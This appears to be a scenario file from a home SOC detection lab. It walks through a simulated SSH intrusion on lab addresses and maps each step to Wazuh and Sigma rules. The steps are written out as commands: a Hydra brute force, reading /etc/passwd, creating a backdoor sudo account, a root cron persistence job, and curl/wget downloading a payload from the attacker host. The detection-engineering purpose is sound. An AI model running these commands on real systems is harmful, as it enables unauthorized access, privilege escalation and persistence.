# Attack Scenario 002: Kali SSH Brute Force, Privilege Escalation & Persistence Intrusion

- **Scenario ID:** `SCENARIO-002`
- **Target:** Ubuntu Server 24.04 (`SOCForge-Linux` @ `192.168.56.107`) — Wazuh Agent `003`
- **Attacker:** Kali Linux (`192.168.56.101`)
- **MITRE Tactics:** Credential Access, Initial Access, Discovery, Privilege Escalation, Persistence, Command & Control
- **Investigation Reference:** [`investigations/CASE-002/investigation.md`](../../investigations/CASE-002/investigation.md)
- **Forensic Timeline:** [`investigations/CASE-002/timeline.md`](../../investigations/CASE-002/timeline.md)

---

## 1. Scenario Summary
An adversary on Kali Linux (`192.168.56.101`) conducts an automated dictionary brute-force attack against an exposed SSH service on the target Linux server (`192.168.56.107`). After obtaining valid credentials for the unprivileged user `socforgelinux`, the attacker establishes an interactive SSH session, conducts local system discovery, abuses sudo privileges to create a backdoor local account (`socforge_backdoor`), elevates the account to the `sudo` group, establishes persistence via a cron job in `/etc/cron.d/socforge_persistence`, and attempts to retrieve a secondary payload from an adversary staging server at `http://192.168.56.101:8080/linux_payload.sh`.

---

## 2. Step-by-Step Simulation Commands

### Step 1: Automated SSH Brute Force Attack (from Kali)
The adversary targets the SSH service using Hydra with a targeted wordlist:
```bash
hydra -l socforgelinux -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.107 -t 4
```
*Telemetry Generated:* Rapid PAM authentication failures logged in `/var/log/auth.log` triggering Wazuh Rule `5712` (SSHD brute force trying to get access to the system, Level 10).

---

### Step 2: Interactive SSH Initial Access (from Kali)
Using the compromised password, the attacker establishes an interactive terminal session:
```bash
ssh socforgelinux@192.168.56.107
```
*Telemetry Generated:* SSH accepted password session logged in `/var/log/auth.log` triggering Wazuh Rule `5715`.

---

### Step 3: Local System & Privilege Discovery (on Target)
The attacker conducts situational awareness and checks for sudo permissions:
```bash
whoami
id
uname -a
cat /etc/passwd
sudo -l
```
*Telemetry Generated:* Process execution and PAM session opening for `sudo` command evaluation.

---

### Step 4: Sudo Abuse - Rogue Backdoor Account Creation (on Target)
The attacker creates a local user account and assigns a known password:
```bash
sudo /usr/sbin/useradd -m -s /bin/bash socforge_backdoor
echo "socforge_backdoor:BackdoorPass123!" | sudo chpasswd
```
*Telemetry Generated:* Auditd and syslog capture `sudo: ... COMMAND=/usr/sbin/useradd ...` triggering custom Wazuh Rule `100200` (Level 10) and Sigma rule `proc_creation_lnx_useradd_backdoor.yml`.

---

### Step 5: Sudoers Privilege Escalation (on Target)
The attacker adds the backdoor account into the administrative `sudo` group:
```bash
sudo /usr/sbin/usermod -aG sudo socforge_backdoor
```
*Telemetry Generated:* Auditd and syslog capture `sudo: ... COMMAND=/usr/sbin/usermod -aG sudo ...` triggering custom Wazuh Rule `100201` (Level 10) and Sigma rule `proc_creation_lnx_usermod_sudoers.yml`.

---

### Step 6: Scheduled Cron Persistence Staging (on Target)
The attacker creates a recurring root cron job under `/etc/cron.d/`:
```bash
echo "* * * * * root /bin/bash -c 'echo persistence > /tmp/socforge_alive'" | sudo tee /etc/cron.d/socforge_persistence
sudo chmod 644 /etc/cron.d/socforge_persistence
```
*Telemetry Generated:* Auditd and syslog capture `sudo: ... COMMAND=/usr/bin/tee /etc/cron.d/socforge_persistence` triggering custom Wazuh Rule `100202` (Level 10) and Sigma rule `proc_creation_lnx_cron_persistence.yml`.

---

### Step 7: C2 Staged Ingress Tool Retrieval (on Target)
The attacker attempts to download a secondary payload from the Kali HTTP stager:
```bash
curl -o /tmp/linux_payload.sh http://192.168.56.101:8080/linux_payload.sh
# Alternative fallback
wget -O /tmp/linux_payload.sh http://192.168.56.101:8080/linux_payload.sh
```
*Telemetry Generated:* Auditd process creation capturing outbound network ingress on non-standard ports, triggering custom Wazuh Rule `100203` (Level 8) and Sigma rule `lnx_ingress_tool_transfer_curl.yml`.

---

## 3. Associated Detection Engineering Rules

| Phase | Technique | Wazuh Custom Rule | Sigma Rule Equivalent |
| :--- | :--- | :--- | :--- |
| **Initial Access** | `T1110.001` (Brute Force) | Rule `5712` (Level 10) | N/A (Core Wazuh PAM rule) |
| **Account Creation** | `T1136.001` (Local Account) | **Rule `100200`** (Level 10) | [`proc_creation_lnx_useradd_backdoor.yml`](../../detections/sigma/proc_creation_lnx_useradd_backdoor.yml) |
| **Privilege Escalation** | `T1098` / `T1548.003` (Sudo) | **Rule `100201`** (Level 10) | [`proc_creation_lnx_usermod_sudoers.yml`](../../detections/sigma/proc_creation_lnx_usermod_sudoers.yml) |
| **Persistence** | `T1053.003` (Cron) | **Rule `100202`** (Level 10) | [`proc_creation_lnx_cron_persistence.yml`](../../detections/sigma/proc_creation_lnx_cron_persistence.yml) |
| **Command & Control** | `T1105` / `T1071.001` (Ingress) | **Rule `100203`** (Level 8) | [`lnx_ingress_tool_transfer_curl.yml`](../../detections/sigma/lnx_ingress_tool_transfer_curl.yml) |
